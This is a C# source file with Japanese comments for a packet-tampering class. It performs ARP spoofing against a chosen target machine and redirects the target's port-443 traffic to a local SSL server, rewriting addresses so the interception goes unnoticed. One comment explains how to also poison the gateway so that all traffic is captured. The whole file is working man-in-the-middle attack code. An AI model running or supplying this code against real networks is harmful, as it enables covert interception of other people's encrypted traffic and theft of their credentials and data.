using System;
using System.Collections.Generic;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Threading.Tasks;

using SharpPcap.WinPcap;
using PacketDotNet;

namespace capture
{

    public class PacketTamper
    {
        private static NicInterface Interface;
        private static IPAddress TargetIP;
        private static IPAddress GatewayIP;
        private static PhysicalAddress TargetMac;
        private static PhysicalAddress GatewayMac;

        private static ArpUtility ArpUtility;

        public static ushort InspectTargetSslPort = 443;

        /// <summary>
        /// 初期化
        /// </summary>
        /// <param name="index">インデックス</param>
        /// <param name="tip">ターゲットIP</param>
        /// <param name="tmac">ターゲットMAC</param>
        /// <param name="gip">ゲートウェイIP</param>
        /// <param name="gmac">ゲートウェイMAC</param>
        public static void Initialize(int index, IPAddress tip, PhysicalAddress tmac, IPAddress gip, PhysicalAddress gmac)
        {
            Interface = new NicInterface(index);
            TargetIP = tip;
            TargetMac = tmac;
            GatewayIP = gip;
            GatewayMac = gmac;

            ArpUtility = new ArpUtility(Interface);
        }

        /// <summary>
        /// キャプチャ開始
        /// </summary>
        public static void Start()
        {
            Interface.Open();
            Interface.StartCapture();
        }

        /// <summary>
        /// キャプチャ終了
        /// </summary>
        public static void Stop()
        {
            Interface.StopCapture();
        }


        /// <summary>
        /// ARP偽装を開始する
        /// </summary>
        public static async void ArpSpoofing()
        {
            // ターゲットからゲートウェイへの送信を自分経由にするため
            ArpUtility.AddArpResponse(TargetMac, TargetIP, Interface.MacAddress, GatewayIP);

            // 自分からターゲットへの送信を自分宛として
            // システムからターゲットへの直接送信するパケットをDropするため
            ArpUtility.AddArpResponse(Interface.MacAddress, Interface.LocalAddress, Interface.MacAddress, TargetIP);

            // Getewayを自分自身は正しく判断するため
            ArpUtility.AddArpResponse(Interface.MacAddress, Interface.LocalAddress, GatewayMac, GatewayIP);

            // スレッドループ開始
            await Task.Run( () => ArpUtility.StartArpResponseLoop() );
        }

        /// <summary>
        /// パケットキャプチャコールバック
        /// </summary>
        /// <param name="nic">キャプチャしているインターフェース</param>
        /// <param name="eth">受信したイーサネットパケット</param>
        /// <param name="ip">受信したIPパケット(Ethernetパケットの場合はNULL)</param>
        /// <param name="tcp">受信したTCPパケット(IPパケットの場合はNULL)</param>
        public static void OnPacketArrival(NicInterface nic, EthernetPacket eth, IpPacket ip, TcpPacket tcp)
        {
            // EthがNULLの場合は対象外
            if (eth == null)
            {
                return;
            }
            // MACアドレスを見て送信者を判断
            else
            {
                //----------------------------------------------------------------
                // 送信者がゲートウェイ
                //----------------------------------------------------------------
                if( equalAddress(eth.SourceHwAddress, GatewayMac) )
                {
                    onPacketArrivalFromGateway(nic, eth, ip, tcp);
                }
                //----------------------------------------------------------------
                // 送信者が自分自身
                //----------------------------------------------------------------
                else if( equalAddress(eth.SourceHwAddress, nic.MacAddress) )
                {
                    onPacketArrivalFromLocalMachine(nic, eth, ip, tcp);
                }
                //----------------------------------------------------------------
                // 送信者がターゲット
                //----------------------------------------------------------------
                else if ( equalAddress(eth.SourceHwAddress, TargetMac) )
                {
                    onPacketArrivalFromTarget(nic, eth, ip, tcp);
                }
                //----------------------------------------------------------------
                // 送信者がそれ以外
                //----------------------------------------------------------------
                else
                {
                    // 何もしない
                }
            }
        }


        /// <summary>
        /// Gatewayから転送されたパケットの処理
        /// </summary>
        /// <param name="nic"></param>
        /// <param name="eth"></param>
        /// <param name="ip"></param>
        /// <param name="tcp"></param>
        private static void onPacketArrivalFromGateway(NicInterface nic, EthernetPacket eth, IpPacket ip, TcpPacket tcp)
        {
            // ターゲット宛のIPパケットの場合
            if ((ip != null) && equalAddress(ip.DestinationAddress, TargetIP))
            {
                // ターゲット宛のパケットの場合
                // 詐称されたMACを書き換えてターゲットへ転送
                // (オリジナルはここで破棄される)

                /// <remarks>
                /// 現在、ゲートウェイにはターゲットを偽装するARPレスポンスは送信していないため
                /// SSL以外の通信はこのローカルマシンを通らない。
                /// 全通信を傍受するためには、ターゲットマシンのMACを自分のMACとするARPレスポンスをゲートウェイに送信する。
                /// </remarks>
                //eth.SourceHwAddress = nic.MacAddress;
                //eth.DestinationHwAddress = TargetMac;
                //nic.SendPacket(eth, ip, tcp);
            }
            else
            {
                // それ以外は何もしない
            }
        }



        /// <summary>
        /// 自分自身(ローカルマシン)から転送されたパケットの処理
        /// </summary>
        /// <param name="nic"></param>
        /// <param name="eth"></param>
        /// <param name="ip"></param>
        /// <param name="tcp"></param>
        private static void onPacketArrivalFromLocalMachine(NicInterface nic, EthernetPacket eth, IpPacket ip, TcpPacket tcp)
        {
            // 宛先が自分のMACの場合は本来はターゲットへ送信するつもりのパケット
            // (IPルーティングは無効なため、オリジナルのこのパケットはここで破棄される)
            if (equalAddress(eth.DestinationHwAddress, nic.MacAddress))
            {
                // SSLサーバーからのTCPパケット送信の場合はターゲットへ送信するパケットになる
                // (SSLサーバー用のSourceポートからターゲットに別プロセスで送信するパケットはないはず)
                if ((ip != null) && (tcp != null) && (tcp.SourcePort == InspectTargetSslPort))
                {
                    foreach (var ss in HookManager.HookSessions)
                    {
                        // 宛先ポートが記憶している送信元ポートと等しいか判定して
                        // 宛先アドレスを書き換えたセッションかどうか確認する
                        if (tcp.DestinationPort == ss.SourcePort)
                        {
                            // ターゲットのMACはローカルマシンのシステム上で自身MACに詐称しているいるため、
                            // システムが送信するすべてのターゲット向けパケットは破棄される(IPが異なるため)
                            // SSLサーバーからの通信は正しいターゲットMACを設定し改めて送信する
                            eth.DestinationHwAddress = TargetMac;

                            // このまま送信すると自IPが送信元となってしまいターゲットで異常と判断されるため
                            // 送信元をターゲットが本来送信した宛先へ書き換える
                            ip.SourceAddress = ss.DestinationAddress;
                            ip.DestinationAddress = ss.SourceAddress;

                            // 送信
                            nic.SendPacket(eth, ip, tcp);

                            break;
                        }
                    }
                }
                // SSLサーバー以外のパケット
                else
                {
                    // 何もしない
                }
            }
            // それ以外のパケットの場合
            else
            {
                // 何もしない
            }
        }


        /// <summary>
        /// ターゲットから転送されたパケットの処理
        /// </summary>
        /// <param name="nic"></param>
        /// <param name="eth"></param>
        /// <param name="ip"></param>
        /// <param name="tcp"></param>
        private static void onPacketArrivalFromTarget(NicInterface nic, EthernetPacket eth, IpPacket ip, TcpPacket tcp)
        {
            // 自分IP宛でないIPパケットは本来はルーターに送っているつもりのパケットで
            // TCPポートがSSL使用ポートであれば書き換え対象のパケットとなる
            // (IPルーティングは無効なため、オリジナルのこのパケットはここで破棄される)
            if ((ip != null) && !equalAddress(ip.DestinationAddress, nic.LocalAddress))
            {
                // SSLサーバーへのアクセスの場合は書き換え対象
                if ((tcp != null) && (tcp.DestinationPort == InspectTargetSslPort))
                {
                    // オリジナルセッションを保存しておき
                    // 後に戻りパケットをキャプチャした時や
                    // SSL中継で本来の宛先に接続する際に参照する
                    var s = new Session(ip.SourceAddress, tcp.SourcePort, ip.DestinationAddress, tcp.DestinationPort);

                    // セッションはソースポート毎に管理する
                    // すでに同じソースポートが存在していたら上書きする
                    HookManager.SetHookSession(s, tcp.SourcePort);

                    // IPルーティングは無効なため
                    // オリジナルパケットはここで破棄
                    // 宛先IPを自身に変更し、自身で稼働中のSSLサーバーへ再送信して通信継続
                    ip.DestinationAddress = nic.LocalAddress;
                    nic.SendPacket(eth, ip, tcp);
                }
                // SSLサーバーへのアクセス以外のTCPパケット、IPパケットの場合
                else
                {
                    // ゲートウェイへそのまま転送
                    eth.SourceHwAddress = nic.MacAddress;
                    eth.DestinationHwAddress = GatewayMac;
                    nic.SendPacket(eth, ip, tcp);
                }
            }
            // 自分IP宛のIPパケットの場合
            else
            {
                // 何もしない
            }
        }


        /// <summary>
        /// MACアドレスが等しいか
        /// </summary>
        /// <param name="addr1"></param>
        /// <param name="addr2"></param>
        /// <returns></returns>
        private static bool equalAddress(PhysicalAddress addr1, PhysicalAddress addr2)
        {
            bool ret = (addr1.ToString() == addr2.ToString());
            return ret;
        }

        /// <summary>
        /// IPアドレスが等しいか
        /// </summary>
        /// <param name="addr1"></param>
        /// <param name="addr2"></param>
        /// <returns></returns>
        private static bool equalAddress(IPAddress addr1, IPAddress addr2)
        {
            bool ret = (addr1.ToString() == addr2.ToString());
            return ret;
        }
    }
}
